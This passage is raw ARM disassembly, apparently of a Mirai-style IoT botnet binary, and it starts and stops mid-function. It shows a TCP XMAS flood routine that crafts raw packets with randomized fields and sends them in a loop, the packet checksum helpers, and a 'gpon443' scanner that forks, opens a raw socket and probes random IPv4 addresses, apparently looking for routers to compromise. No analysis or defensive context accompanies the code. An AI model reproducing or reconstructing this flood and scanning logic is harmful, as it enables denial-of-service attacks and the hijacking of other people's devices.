    e644:	e5d8200d 	ldrb	r2, [r8, #13]
    e648:	e3c33070 	bic	r3, r3, #112	; 0x70
    e64c:	e3833080 	orr	r3, r3, #128	; 0x80
    e650:	e3822010 	orr	r2, r2, #16
    e654:	e5881008 	str	r1, [r8, #8]
    e658:	e5c8300c 	strb	r3, [r8, #12]
    e65c:	e5c8200d 	strb	r2, [r8, #13]
    e660:	eb000fe4 	bl	125f8 <rand_next>
    e664:	e59d1020 	ldr	r1, [sp, #32]
    e668:	e5d8300d 	ldrb	r3, [r8, #13]
    e66c:	e2012001 	and	r2, r1, #1
    e670:	e3c33020 	bic	r3, r3, #32
    e674:	e1833282 	orr	r3, r3, r2, lsl #5
    e678:	e5c8300d 	strb	r3, [r8, #13]
    e67c:	e59dc024 	ldr	ip, [sp, #36]	; 0x24
    e680:	e5d8200d 	ldrb	r2, [r8, #13]
    e684:	e20c3001 	and	r3, ip, #1
    e688:	e3c22010 	bic	r2, r2, #16
    e68c:	e1822203 	orr	r2, r2, r3, lsl #4
    e690:	e5c8200d 	strb	r2, [r8, #13]
    e694:	e59d1028 	ldr	r1, [sp, #40]	; 0x28
    e698:	e5d8300d 	ldrb	r3, [r8, #13]
    e69c:	e2012001 	and	r2, r1, #1
    e6a0:	e3c33008 	bic	r3, r3, #8
    e6a4:	e1833182 	orr	r3, r3, r2, lsl #3
    e6a8:	e5c8300d 	strb	r3, [r8, #13]
    e6ac:	e59dc02c 	ldr	ip, [sp, #44]	; 0x2c
    e6b0:	e5d8200d 	ldrb	r2, [r8, #13]
    e6b4:	e20c3001 	and	r3, ip, #1
    e6b8:	e3c22004 	bic	r2, r2, #4
    e6bc:	e1822103 	orr	r2, r2, r3, lsl #2
    e6c0:	e5c8200d 	strb	r2, [r8, #13]
    e6c4:	e59d1030 	ldr	r1, [sp, #48]	; 0x30
    e6c8:	e5d8300d 	ldrb	r3, [r8, #13]
    e6cc:	e2012001 	and	r2, r1, #1
    e6d0:	e3c33002 	bic	r3, r3, #2
    e6d4:	e1833082 	orr	r3, r3, r2, lsl #1
    e6d8:	e5c8300d 	strb	r3, [r8, #13]
    e6dc:	e59dc034 	ldr	ip, [sp, #52]	; 0x34
    e6e0:	e5d8200d 	ldrb	r2, [r8, #13]
    e6e4:	e20c3001 	and	r3, ip, #1
    e6e8:	e3c22001 	bic	r2, r2, #1
    e6ec:	e1833002 	orr	r3, r3, r2
    e6f0:	e5c8300d 	strb	r3, [r8, #13]
    e6f4:	e1c800be 	strh	r0, [r8, #14]
    e6f8:	e59d1038 	ldr	r1, [sp, #56]	; 0x38
    e6fc:	e2840028 	add	r0, r4, #40	; 0x28
    e700:	eb001021 	bl	1278c <rand_str>
    e704:	eaffff52 	b	e454 <attack_method_tcpxmas+0x398>
    e708:	e59d1038 	ldr	r1, [sp, #56]	; 0x38
    e70c:	e2817028 	add	r7, r1, #40	; 0x28
    e710:	e1a02801 	lsl	r2, r1, #16
    e714:	e281a014 	add	sl, r1, #20
    e718:	e2822705 	add	r2, r2, #1310720	; 0x140000
    e71c:	e1a03402 	lsl	r3, r2, #8
    e720:	e1a03823 	lsr	r3, r3, #16
    e724:	e1838c22 	orr	r8, r3, r2, lsr #24
    e728:	e3a03000 	mov	r3, #0
    e72c:	e3560000 	cmp	r6, #0
    e730:	e58d3164 	str	r3, [sp, #356]	; 0x164
    e734:	0afffffb 	beq	e728 <attack_method_tcpxmas+0x66c>
    e738:	e1a00003 	mov	r0, r3
    e73c:	e59d2010 	ldr	r2, [sp, #16]
    e740:	e3a03801 	mov	r3, #65536	; 0x10000
    e744:	e7924100 	ldr	r4, [r2, r0, lsl #2]
    e748:	e2433001 	sub	r3, r3, #1
    e74c:	e15b0003 	cmp	fp, r3
    e750:	e2845014 	add	r5, r4, #20
    e754:	0a00003b 	beq	e848 <attack_method_tcpxmas+0x78c>
    e758:	e59d303c 	ldr	r3, [sp, #60]	; 0x3c
    e75c:	e3530000 	cmp	r3, #0
    e760:	1a00003d 	bne	e85c <attack_method_tcpxmas+0x7a0>
    e764:	e3a0c000 	mov	ip, #0
    e768:	e1c4c0ba 	strh	ip, [r4, #10]
    e76c:	e3a01014 	mov	r1, #20
    e770:	e1a00004 	mov	r0, r4
    e774:	eb00003d 	bl	e870 <checksum_generic>
    e778:	e59d1164 	ldr	r1, [sp, #356]	; 0x164
    e77c:	e59d200c 	ldr	r2, [sp, #12]
    e780:	e1a01201 	lsl	r1, r1, #4
    e784:	e0811002 	add	r1, r1, r2
    e788:	e5912004 	ldr	r2, [r1, #4]
    e78c:	e1a0c802 	lsl	ip, r2, #16
    e790:	e1a0342c 	lsr	r3, ip, #8
    e794:	e2033cff 	and	r3, r3, #65280	; 0xff00
    e798:	e1833c2c 	orr	r3, r3, ip, lsr #24
    e79c:	e2822001 	add	r2, r2, #1
    e7a0:	e5812004 	str	r2, [r1, #4]
    e7a4:	e5853004 	str	r3, [r5, #4]
    e7a8:	e5912008 	ldr	r2, [r1, #8]
    e7ac:	e1a02802 	lsl	r2, r2, #16
    e7b0:	e1a03422 	lsr	r3, r2, #8
    e7b4:	e2033cff 	and	r3, r3, #65280	; 0xff00
    e7b8:	e1833c22 	orr	r3, r3, r2, lsr #24
    e7bc:	e5853008 	str	r3, [r5, #8]
    e7c0:	e3a03000 	mov	r3, #0
    e7c4:	e1c400ba 	strh	r0, [r4, #10]
    e7c8:	e1a01005 	mov	r1, r5
    e7cc:	e1c531b0 	strh	r3, [r5, #16]
    e7d0:	e1a02008 	mov	r2, r8
    e7d4:	e1a0300a 	mov	r3, sl
    e7d8:	e1a00004 	mov	r0, r4
    e7dc:	eb000037 	bl	e8c0 <checksum_tcpudp>
    e7e0:	e59d3164 	ldr	r3, [sp, #356]	; 0x164
    e7e4:	e59dc008 	ldr	ip, [sp, #8]
    e7e8:	e1a0e283 	lsl	lr, r3, #5
    e7ec:	e1c501b0 	strh	r0, [r5, #16]
    e7f0:	e04ee183 	sub	lr, lr, r3, lsl #3
    e7f4:	e1d550b2 	ldrh	r5, [r5, #2]
    e7f8:	e08ee00c 	add	lr, lr, ip
    e7fc:	e1ce50b2 	strh	r5, [lr, #2]
    e800:	e3a03901 	mov	r3, #16384	; 0x4000
    e804:	e3a0c010 	mov	ip, #16
    e808:	e1a01004 	mov	r1, r4
    e80c:	e1a00009 	mov	r0, r9
    e810:	e1a02007 	mov	r2, r7
    e814:	e58de000 	str	lr, [sp]
    e818:	e58dc004 	str	ip, [sp, #4]
    e81c:	eb0021d8 	bl	16f84 <__libc_sendto>
    e820:	e59d3164 	ldr	r3, [sp, #356]	; 0x164
    e824:	e2830001 	add	r0, r3, #1
    e828:	e1560000 	cmp	r6, r0
    e82c:	e58d0164 	str	r0, [sp, #356]	; 0x164
    e830:	caffffc1 	bgt	e73c <attack_method_tcpxmas+0x680>
    e834:	e3a03000 	mov	r3, #0
    e838:	e3560000 	cmp	r6, #0
    e83c:	e58d3164 	str	r3, [sp, #356]	; 0x164
    e840:	0affffb8 	beq	e728 <attack_method_tcpxmas+0x66c>
    e844:	eaffffbb 	b	e738 <attack_method_tcpxmas+0x67c>
    e848:	eb000f6a 	bl	125f8 <rand_next>
    e84c:	e59d303c 	ldr	r3, [sp, #60]	; 0x3c
    e850:	e3530000 	cmp	r3, #0
    e854:	e1c400b4 	strh	r0, [r4, #4]
    e858:	0affffc1 	beq	e764 <attack_method_tcpxmas+0x6a8>
    e85c:	e2840028 	add	r0, r4, #40	; 0x28
    e860:	e59d1038 	ldr	r1, [sp, #56]	; 0x38
    e864:	eb000fc8 	bl	1278c <rand_str>
    e868:	eaffffbd 	b	e764 <attack_method_tcpxmas+0x6a8>
    e86c:	0002b8ac 	.word	0x0002b8ac

0000e870 <checksum_generic>:
    e870:	e3510001 	cmp	r1, #1
    e874:	93a02000 	movls	r2, #0
    e878:	9a000005 	bls	e894 <checksum_generic+0x24>
    e87c:	e3a02000 	mov	r2, #0
    e880:	e2411002 	sub	r1, r1, #2
    e884:	e0d030b2 	ldrh	r3, [r0], #2
    e888:	e3510001 	cmp	r1, #1
    e88c:	e0822003 	add	r2, r2, r3
    e890:	8afffffa 	bhi	e880 <checksum_generic+0x10>
    e894:	e3510001 	cmp	r1, #1
    e898:	05d03000 	ldrbeq	r3, [r0]
    e89c:	00822003 	addeq	r2, r2, r3
    e8a0:	e1a00802 	lsl	r0, r2, #16
    e8a4:	e1a00820 	lsr	r0, r0, #16
    e8a8:	e0800822 	add	r0, r0, r2, lsr #16
    e8ac:	e0800820 	add	r0, r0, r0, lsr #16
    e8b0:	e1e00000 	mvn	r0, r0
    e8b4:	e1a00800 	lsl	r0, r0, #16
    e8b8:	e1a00820 	lsr	r0, r0, #16
    e8bc:	e12fff1e 	bx	lr

0000e8c0 <checksum_tcpudp>:
    e8c0:	e3530001 	cmp	r3, #1
    e8c4:	e92d4070 	push	{r4, r5, r6, lr}
    e8c8:	e1a0c003 	mov	ip, r3
    e8cc:	e1a06002 	mov	r6, r2
    e8d0:	e590500c 	ldr	r5, [r0, #12]
    e8d4:	e5904010 	ldr	r4, [r0, #16]
    e8d8:	d3a0e000 	movle	lr, #0
    e8dc:	da000005 	ble	e8f8 <checksum_tcpudp+0x38>
    e8e0:	e3a0e000 	mov	lr, #0
    e8e4:	e24cc002 	sub	ip, ip, #2
    e8e8:	e0d130b2 	ldrh	r3, [r1], #2
    e8ec:	e35c0001 	cmp	ip, #1
    e8f0:	e08ee003 	add	lr, lr, r3
    e8f4:	cafffffa 	bgt	e8e4 <checksum_tcpudp+0x24>
    e8f8:	e35c0001 	cmp	ip, #1
    e8fc:	05d13000 	ldrbeq	r3, [r1]
    e900:	e1a02805 	lsl	r2, r5, #16
    e904:	008ee003 	addeq	lr, lr, r3
    e908:	e1a03804 	lsl	r3, r4, #16
    e90c:	e1a02822 	lsr	r2, r2, #16
    e910:	e1a03823 	lsr	r3, r3, #16
    e914:	e0833002 	add	r3, r3, r2
    e918:	e0833825 	add	r3, r3, r5, lsr #16
    e91c:	e5d02009 	ldrb	r2, [r0, #9]
    e920:	e0833824 	add	r3, r3, r4, lsr #16
    e924:	e0833006 	add	r3, r3, r6
    e928:	e1a02402 	lsl	r2, r2, #8
    e92c:	e083300e 	add	r3, r3, lr
    e930:	e0830002 	add	r0, r3, r2
    e934:	e1b02820 	lsrs	r2, r0, #16
    e938:	0a000004 	beq	e950 <checksum_tcpudp+0x90>
    e93c:	e1a03800 	lsl	r3, r0, #16
    e940:	e1a03823 	lsr	r3, r3, #16
    e944:	e0830002 	add	r0, r3, r2
    e948:	e1b02820 	lsrs	r2, r0, #16
    e94c:	1afffffa 	bne	e93c <checksum_tcpudp+0x7c>
    e950:	e1e00000 	mvn	r0, r0
    e954:	e1a00800 	lsl	r0, r0, #16
    e958:	e1a00820 	lsr	r0, r0, #16
    e95c:	e8bd4070 	pop	{r4, r5, r6, lr}
    e960:	e12fff1e 	bx	lr

0000e964 <gpon443_kill>:
    e964:	e52de004 	push	{lr}		; (str lr, [sp, #-4]!)
    e968:	e59f3018 	ldr	r3, [pc, #24]	; e988 <gpon443_kill+0x24>
    e96c:	e24dd004 	sub	sp, sp, #4
    e970:	e5930000 	ldr	r0, [r3]
    e974:	e3a01009 	mov	r1, #9
    e978:	eb001e07 	bl	1619c <__GI_kill>
    e97c:	e28dd004 	add	sp, sp, #4
    e980:	e49de004 	pop	{lr}		; (ldr lr, [sp], #4)
    e984:	e12fff1e 	bx	lr
    e988:	00028c90 	.word	0x00028c90

0000e98c <gpon443_setup_connection>:
    e98c:	e92d4070 	push	{r4, r5, r6, lr}
    e990:	e1a05000 	mov	r5, r0
    e994:	e5900000 	ldr	r0, [r0]
    e998:	e24dd010 	sub	sp, sp, #16
    e99c:	e3a06000 	mov	r6, #0
    e9a0:	e3700001 	cmn	r0, #1
    e9a4:	e58d6000 	str	r6, [sp]
    e9a8:	e58d6004 	str	r6, [sp, #4]
    e9ac:	e58d6008 	str	r6, [sp, #8]
    e9b0:	e58d600c 	str	r6, [sp, #12]
    e9b4:	1b002d21 	blne	19e40 <__GI___libc_close>
    e9b8:	e3a00002 	mov	r0, #2
    e9bc:	e3a01001 	mov	r1, #1
    e9c0:	e1a02006 	mov	r2, r6
    e9c4:	eb0021a2 	bl	17054 <__GI_socket>
    e9c8:	e3700001 	cmn	r0, #1
    e9cc:	e5850000 	str	r0, [r5]
    e9d0:	0a00001f 	beq	ea54 <gpon443_setup_connection+0xc8>
    e9d4:	e3a01e43 	mov	r1, #1072	; 0x430
    e9d8:	e2811008 	add	r1, r1, #8
    e9dc:	e2850018 	add	r0, r5, #24
    e9e0:	e5856014 	str	r6, [r5, #20]
    e9e4:	eb001874 	bl	14bbc <util_zero>
    e9e8:	e5954000 	ldr	r4, [r5]
    e9ec:	e1a02006 	mov	r2, r6
    e9f0:	e3a01003 	mov	r1, #3
    e9f4:	e1a00004 	mov	r0, r4
    e9f8:	eb001d6d 	bl	15fb4 <__GI___libc_fcntl>
    e9fc:	e3a01004 	mov	r1, #4
    ea00:	e3802b02 	orr	r2, r0, #2048	; 0x800
    ea04:	e1a00004 	mov	r0, r4
    ea08:	eb001d69 	bl	15fb4 <__GI___libc_fcntl>
    ea0c:	e59f304c 	ldr	r3, [pc, #76]	; ea60 <gpon443_setup_connection+0xd4>
    ea10:	e5931000 	ldr	r1, [r3]
    ea14:	e595300c 	ldr	r3, [r5, #12]
    ea18:	e58d3004 	str	r3, [sp, #4]
    ea1c:	e3a03002 	mov	r3, #2
    ea20:	e5952008 	ldr	r2, [r5, #8]
    ea24:	e1cd30b0 	strh	r3, [sp]
    ea28:	e2422003 	sub	r2, r2, #3
    ea2c:	e1d531b0 	ldrh	r3, [r5, #16]
    ea30:	e3520001 	cmp	r2, #1
    ea34:	e1cd30b2 	strh	r3, [sp, #2]
    ea38:	83a03001 	movhi	r3, #1
    ea3c:	e5851004 	str	r1, [r5, #4]
    ea40:	85853008 	strhi	r3, [r5, #8]
    ea44:	e5950000 	ldr	r0, [r5]
    ea48:	e1a0100d 	mov	r1, sp
    ea4c:	e3a02010 	mov	r2, #16
    ea50:	eb00205a 	bl	16bc0 <__libc_connect>
    ea54:	e28dd010 	add	sp, sp, #16
    ea58:	e8bd4070 	pop	{r4, r5, r6, lr}
    ea5c:	e12fff1e 	bx	lr
    ea60:	00028cc0 	.word	0x00028cc0

0000ea64 <gpon443_scanner>:
    ea64:	e92d4ff0 	push	{r4, r5, r6, r7, r8, r9, sl, fp, lr}
    ea68:	e24dde72 	sub	sp, sp, #1824	; 0x720
    ea6c:	e3a03000 	mov	r3, #0
    ea70:	e24dd00c 	sub	sp, sp, #12
    ea74:	e58d3724 	str	r3, [sp, #1828]	; 0x724
    ea78:	eb002b34 	bl	19750 <__libc_fork>
    ea7c:	e3700001 	cmn	r0, #1
    ea80:	13a03000 	movne	r3, #0
    ea84:	03a03001 	moveq	r3, #1
    ea88:	e3500000 	cmp	r0, #0
    ea8c:	d1a04003 	movle	r4, r3
    ea90:	c3834001 	orrgt	r4, r3, #1
    ea94:	e59f3b5c 	ldr	r3, [pc, #2908]	; f5f8 <gpon443_scanner+0xb94>
    ea98:	e3540000 	cmp	r4, #0
    ea9c:	e5830000 	str	r0, [r3]
    eaa0:	0a000003 	beq	eab4 <gpon443_scanner+0x50>
    eaa4:	e28ddfcb 	add	sp, sp, #812	; 0x32c
    eaa8:	e28ddb01 	add	sp, sp, #1024	; 0x400
    eaac:	e8bd4ff0 	pop	{r4, r5, r6, r7, r8, r9, sl, fp, lr}
    eab0:	e12fff1e 	bx	lr
    eab4:	eb0018ca 	bl	14de4 <util_local_addr>
    eab8:	e59f1b3c 	ldr	r1, [pc, #2876]	; f5fc <gpon443_scanner+0xb98>
    eabc:	e5810000 	str	r0, [r1]
    eac0:	eb000ee3 	bl	12654 <rand_init>
    eac4:	e1a00004 	mov	r0, r4
    eac8:	eb001e47 	bl	163ec <__GI_time>
    eacc:	e59f2b2c 	ldr	r2, [pc, #2860]	; f600 <gpon443_scanner+0xb9c>
    ead0:	e3a01dad 	mov	r1, #11072	; 0x2b40
    ead4:	e5820000 	str	r0, [r2]
    ead8:	e2811028 	add	r1, r1, #40	; 0x28
    eadc:	e3a00c01 	mov	r0, #256	; 0x100
    eae0:	eb00243d 	bl	17bdc <calloc>
    eae4:	e59f3b18 	ldr	r3, [pc, #2840]	; f604 <gpon443_scanner+0xba0>
    eae8:	e58d4724 	str	r4, [sp, #1828]	; 0x724
    eaec:	e5830000 	str	r0, [r3]
    eaf0:	e59dc724 	ldr	ip, [sp, #1828]	; 0x724
    eaf4:	e1a03284 	lsl	r3, r4, #5
    eaf8:	e1a0228c 	lsl	r2, ip, #5
    eafc:	e0433104 	sub	r3, r3, r4, lsl #2
    eb00:	e042210c 	sub	r2, r2, ip, lsl #2
    eb04:	e0833004 	add	r3, r3, r4
    eb08:	e082200c 	add	r2, r2, ip
    eb0c:	e1a03203 	lsl	r3, r3, #4
    eb10:	e1a02202 	lsl	r2, r2, #4
    eb14:	e0643003 	rsb	r3, r4, r3
    eb18:	e06c2002 	rsb	r2, ip, r2
    eb1c:	e59f6ae0 	ldr	r6, [pc, #2784]	; f604 <gpon443_scanner+0xba0>
    eb20:	e1a01103 	lsl	r1, r3, #2
    eb24:	e1a00102 	lsl	r0, r2, #2
    eb28:	e596e000 	ldr	lr, [r6]
    eb2c:	e0631001 	rsb	r1, r3, r1
    eb30:	e0620000 	rsb	r0, r2, r0
    eb34:	e28c4001 	add	r4, ip, #1
    eb38:	e1a00180 	lsl	r0, r0, #3
    eb3c:	e1a01181 	lsl	r1, r1, #3
    eb40:	e3a02dad 	mov	r2, #11072	; 0x2b40
    eb44:	e3a05000 	mov	r5, #0
    eb48:	e081100e 	add	r1, r1, lr
    eb4c:	e2822024 	add	r2, r2, #36	; 0x24
    eb50:	e080c00e 	add	ip, r0, lr
    eb54:	e3e03000 	mvn	r3, #0
    eb58:	e35400ff 	cmp	r4, #255	; 0xff
    eb5c:	e780300e 	str	r3, [r0, lr]
    eb60:	e78c5002 	str	r5, [ip, r2]
    eb64:	e5815008 	str	r5, [r1, #8]
    eb68:	e58d4724 	str	r4, [sp, #1828]	; 0x724
    eb6c:	daffffdf 	ble	eaf0 <gpon443_scanner+0x8c>
    eb70:	e3a00002 	mov	r0, #2
    eb74:	e3a01003 	mov	r1, #3
    eb78:	e3a02006 	mov	r2, #6
    eb7c:	eb002134 	bl	17054 <__GI_socket>
    eb80:	e59fca80 	ldr	ip, [pc, #2688]	; f608 <gpon443_scanner+0xba4>
    eb84:	e3700001 	cmn	r0, #1
    eb88:	e1a04000 	mov	r4, r0
    eb8c:	e58c0000 	str	r0, [ip]
    eb90:	0a00010f 	beq	efd4 <gpon443_scanner+0x570>
    eb94:	e3a01003 	mov	r1, #3
    eb98:	e1a02005 	mov	r2, r5
    eb9c:	eb001d04 	bl	15fb4 <__GI___libc_fcntl>
    eba0:	e3a01004 	mov	r1, #4
    eba4:	e3802b02 	orr	r2, r0, #2048	; 0x800
    eba8:	e1a00004 	mov	r0, r4
    ebac:	eb001d00 	bl	15fb4 <__GI___libc_fcntl>
    ebb0:	e59fea50 	ldr	lr, [pc, #2640]	; f608 <gpon443_scanner+0xba4>
    ebb4:	e28d3e72 	add	r3, sp, #1824	; 0x720
    ebb8:	e2833008 	add	r3, r3, #8
    ebbc:	e3a02001 	mov	r2, #1
    ebc0:	e5232004 	str	r2, [r3, #-4]!
    ebc4:	e59e0000 	ldr	r0, [lr]
    ebc8:	e3a0c004 	mov	ip, #4
    ebcc:	e1a01005 	mov	r1, r5
    ebd0:	e2822002 	add	r2, r2, #2
    ebd4:	e58dc000 	str	ip, [sp]
    ebd8:	eb00210b 	bl	1700c <__GI_setsockopt>
    ebdc:	e3500000 	cmp	r0, #0
    ebe0:	1a0000f8 	bne	efc8 <gpon443_scanner+0x564>
    ebe4:	eb000e83 	bl	125f8 <rand_next>
    ebe8:	e1a00800 	lsl	r0, r0, #16
    ebec:	e1a02820 	lsr	r2, r0, #16
    ebf0:	e20230ff 	and	r3, r2, #255	; 0xff
    ebf4:	e1a03403 	lsl	r3, r3, #8
    ebf8:	e1833c20 	orr	r3, r3, r0, lsr #24
    ebfc:	e3530b01 	cmp	r3, #1024	; 0x400
    ec00:	e58d2010 	str	r2, [sp, #16]
    ec04:	3afffff6 	bcc	ebe4 <gpon443_scanner+0x180>
    ec08:	e59f99fc 	ldr	r9, [pc, #2556]	; f60c <gpon443_scanner+0xba8>
    ec0c:	e5d93000 	ldrb	r3, [r9]
    ec10:	e3c3300a 	bic	r3, r3, #10
    ec14:	e3833005 	orr	r3, r3, #5
    ec18:	e5c93000 	strb	r3, [r9]
    ec1c:	e5d92000 	ldrb	r2, [r9]
    ec20:	e3c220b0 	bic	r2, r2, #176	; 0xb0
    ec24:	e3822040 	orr	r2, r2, #64	; 0x40
    ec28:	e3a03b0a 	mov	r3, #10240	; 0x2800
    ec2c:	e5c92000 	strb	r2, [r9]
    ec30:	e1c930b2 	strh	r3, [r9, #2]
    ec34:	eb000e6f 	bl	125f8 <rand_next>
    ec38:	e59f69d0 	ldr	r6, [pc, #2512]	; f610 <gpon443_scanner+0xbac>
    ec3c:	e5d6100c 	ldrb	r1, [r6, #12]
    ec40:	e3c110a0 	bic	r1, r1, #160	; 0xa0
    ec44:	e3a03040 	mov	r3, #64	; 0x40
    ec48:	e3811050 	orr	r1, r1, #80	; 0x50
    ec4c:	e3a02006 	mov	r2, #6
    ec50:	e3e0cb11 	mvn	ip, #17408	; 0x4400
    ec54:	e5c93008 	strb	r3, [r9, #8]
    ec58:	e1c900b4 	strh	r0, [r9, #4]
    ec5c:	e5c92009 	strb	r2, [r9, #9]
    ec60:	e24cc0fe 	sub	ip, ip, #254	; 0xfe
    ec64:	e5c6100c 	strb	r1, [r6, #12]
    ec68:	e1c6c0b2 	strh	ip, [r6, #2]
    ec6c:	e59dc010 	ldr	ip, [sp, #16]
    ec70:	e1c9c1b4 	strh	ip, [r9, #20]
    ec74:	eb000e5f 	bl	125f8 <rand_next>
    ec78:	e5d6300d 	ldrb	r3, [r6, #13]
    ec7c:	e28de028 	add	lr, sp, #40	; 0x28
    ec80:	e3833002 	orr	r3, r3, #2
    ec84:	e24ee00e 	sub	lr, lr, #14
    ec88:	e5c6300d 	strb	r3, [r6, #13]
    ec8c:	e1c600be 	strh	r0, [r6, #14]
    ec90:	e58de00c 	str	lr, [sp, #12]
    ec94:	e59f1964 	ldr	r1, [pc, #2404]	; f600 <gpon443_scanner+0xb9c>
    ec98:	e59d2014 	ldr	r2, [sp, #20]
    ec9c:	e5915000 	ldr	r5, [r1]
    eca0:	e1520005 	cmp	r2, r5
    eca4:	0a000058 	beq	ee0c <gpon443_scanner+0x3a8>
    eca8:	e3a03000 	mov	r3, #0
    ecac:	e58d3724 	str	r3, [sp, #1828]	; 0x724
    ecb0:	e3a03000 	mov	r3, #0
    ecb4:	e58d3710 	str	r3, [sp, #1808]	; 0x710
    ecb8:	e58d3704 	str	r3, [sp, #1796]	; 0x704
    ecbc:	e58d3708 	str	r3, [sp, #1800]	; 0x708
    ecc0:	e58d370c 	str	r3, [sp, #1804]	; 0x70c
    ecc4:	eb000e4b 	bl	125f8 <rand_next>
    ecc8:	e59f692c 	ldr	r6, [pc, #2348]	; f5fc <gpon443_scanner+0xb98>
    eccc:	e5963000 	ldr	r3, [r6]
    ecd0:	e1c900b4 	strh	r0, [r9, #4]
    ecd4:	e589300c 	str	r3, [r9, #12]
    ecd8:	eb002681 	bl	186e4 <rand>
    ecdc:	e1a04000 	mov	r4, r0
    ece0:	eb000e44 	bl	125f8 <rand_next>
    ece4:	e59f3928 	ldr	r3, [pc, #2344]	; f614 <gpon443_scanner+0xbb0>
    ece8:	e082c493 	umull	ip, r2, r3, r4
    ecec:	e1a021a2 	lsr	r2, r2, #3
    ecf0:	e1a03202 	lsl	r3, r2, #4
    ecf4:	e0433102 	sub	r3, r3, r2, lsl #2
    ecf8:	e0623003 	rsb	r3, r2, r3
    ecfc:	e59fe914 	ldr	lr, [pc, #2324]	; f618 <gpon443_scanner+0xbb4>
    ed00:	e0634004 	rsb	r4, r3, r4
    ed04:	e7de1104 	ldrb	r1, [lr, r4, lsl #2]
    ed08:	e1a03420 	lsr	r3, r0, #8
    ed0c:	e1a02820 	lsr	r2, r0, #16
    ed10:	e3510000 	cmp	r1, #0
    ed14:	1351007f 	cmpne	r1, #127	; 0x7f
    ed18:	13a04000 	movne	r4, #0
    ed1c:	03a04001 	moveq	r4, #1
    ed20:	e20330ff 	and	r3, r3, #255	; 0xff
    ed24:	e20220ff 	and	r2, r2, #255	; 0xff
    ed28:	e1a00c20 	lsr	r0, r0, #24
    ed2c:	0affffe9 	beq	ecd8 <gpon443_scanner+0x274>
    ed30:	e1a03803 	lsl	r3, r3, #16
    ed34:	e1833c01 	orr	r3, r3, r1, lsl #24
    ed38:	e1833000 	orr	r3, r3, r0
    ed3c:	e1833402 	orr	r3, r3, r2, lsl #8
    ed40:	e20308ff 	and	r0, r3, #16711680	; 0xff0000
    ed44:	e1a02c23 	lsr	r2, r3, #24
    ed48:	e2031cff 	and	r1, r3, #65280	; 0xff00
    ed4c:	e1822420 	orr	r2, r2, r0, lsr #8
    ed50:	e1822401 	orr	r2, r2, r1, lsl #8
    ed54:	e1822c03 	orr	r2, r2, r3, lsl #24
    ed58:	e3a01014 	mov	r1, #20
    ed5c:	e59f08a8 	ldr	r0, [pc, #2216]	; f60c <gpon443_scanner+0xba8>
    ed60:	e5892010 	str	r2, [r9, #16]
    ed64:	e1c940ba 	strh	r4, [r9, #10]
    ed68:	ebfffec0 	bl	e870 <checksum_generic>
    ed6c:	e59f689c 	ldr	r6, [pc, #2204]	; f610 <gpon443_scanner+0xbac>
    ed70:	e1c900ba 	strh	r0, [r9, #10]
    ed74:	e599e010 	ldr	lr, [r9, #16]
    ed78:	e59f088c 	ldr	r0, [pc, #2188]	; f60c <gpon443_scanner+0xba8>
    ed7c:	e3e0cb11 	mvn	ip, #17408	; 0x4400
    ed80:	e24cc0fe 	sub	ip, ip, #254	; 0xfe
    ed84:	e1c6c0b2 	strh	ip, [r6, #2]
    ed88:	e586e004 	str	lr, [r6, #4]
    ed8c:	e2801014 	add	r1, r0, #20
    ed90:	e3a02b05 	mov	r2, #5120	; 0x1400
    ed94:	e3a03014 	mov	r3, #20
    ed98:	e1c641b0 	strh	r4, [r6, #16]
    ed9c:	ebfffec7 	bl	e8c0 <checksum_tcpudp>
    eda0:	e599e010 	ldr	lr, [r9, #16]
    eda4:	e59fc85c 	ldr	ip, [pc, #2140]	; f608 <gpon443_scanner+0xba4>
    eda8:	e1c601b0 	strh	r0, [r6, #16]
    edac:	e59c3000 	ldr	r3, [ip]
    edb0:	e58de708 	str	lr, [sp, #1800]	; 0x708
    edb4:	e3a0c010 	mov	ip, #16
    edb8:	e28dec07 	add	lr, sp, #1792	; 0x700
    edbc:	e3a06002 	mov	r6, #2
    edc0:	e58dc004 	str	ip, [sp, #4]
    edc4:	e1ce60b4 	strh	r6, [lr, #4]
    edc8:	e59fc840 	ldr	ip, [pc, #2112]	; f610 <gpon443_scanner+0xbac>
    edcc:	e1dcc0b2 	ldrh	ip, [ip, #2]
    edd0:	e1cec0b6 	strh	ip, [lr, #6]
    edd4:	e28dec07 	add	lr, sp, #1792	; 0x700
    edd8:	e1a00003 	mov	r0, r3
    eddc:	e28ee004 	add	lr, lr, #4
    ede0:	e3a03901 	mov	r3, #16384	; 0x4000
    ede4:	e59f1820 	ldr	r1, [pc, #2080]	; f60c <gpon443_scanner+0xba8>
    ede8:	e3a02028 	mov	r2, #40	; 0x28
    edec:	e58de000 	str	lr, [sp]
    edf0:	eb002063 	bl	16f84 <__libc_sendto>
    edf4:	e59d3724 	ldr	r3, [sp, #1828]	; 0x724
    edf8:	e2833001 	add	r3, r3, #1
    edfc:	e3530fc5 	cmp	r3, #788	; 0x314
    ee00:	e58d3724 	str	r3, [sp, #1828]	; 0x724
    ee04:	baffffa9 	blt	ecb0 <gpon443_scanner+0x24c>
    ee08:	e58d5014 	str	r5, [sp, #20]
    ee0c:	eb001e91 	bl	16858 <__GI___errno_location>
    ee10:	e59d100c 	ldr	r1, [sp, #12]
    ee14:	e1a0a000 	mov	sl, r0
    ee18:	e2814014 	add	r4, r1, #20
    ee1c:	e3a05000 	mov	r5, #0
    ee20:	e3a0c000 	mov	ip, #0
    ee24:	e58ac000 	str	ip, [sl]
    ee28:	e59f27d8 	ldr	r2, [pc, #2008]	; f608 <gpon443_scanner+0xba4>
    ee2c:	e5920000 	ldr	r0, [r2]
    ee30:	e3a02e5e 	mov	r2, #1504	; 0x5e0
    ee34:	e282200a 	add	r2, r2, #10
    ee38:	e59d100c 	ldr	r1, [sp, #12]
    ee3c:	e3a03901 	mov	r3, #16384	; 0x4000
    ee40:	e58dc004 	str	ip, [sp, #4]
    ee44:	e58dc000 	str	ip, [sp]
    ee48:	eb001feb 	bl	16dfc <__libc_recvfrom>
    ee4c:	e3500000 	cmp	r0, #0
    ee50:	da000061 	ble	efdc <gpon443_scanner+0x578>
    ee54:	e59a3000 	ldr	r3, [sl]
    ee58:	e353000b 	cmp	r3, #11
    ee5c:	0a00005e 	beq	efdc <gpon443_scanner+0x578>
    ee60:	e3500027 	cmp	r0, #39	; 0x27
    ee64:	9affffed 	bls	ee20 <gpon443_scanner+0x3bc>
    ee68:	e59d300c 	ldr	r3, [sp, #12]
    ee6c:	e59f6788 	ldr	r6, [pc, #1928]	; f5fc <gpon443_scanner+0xb98>
    ee70:	e5932010 	ldr	r2, [r3, #16]
    ee74:	e5963000 	ldr	r3, [r6]
    ee78:	e1520003 	cmp	r2, r3
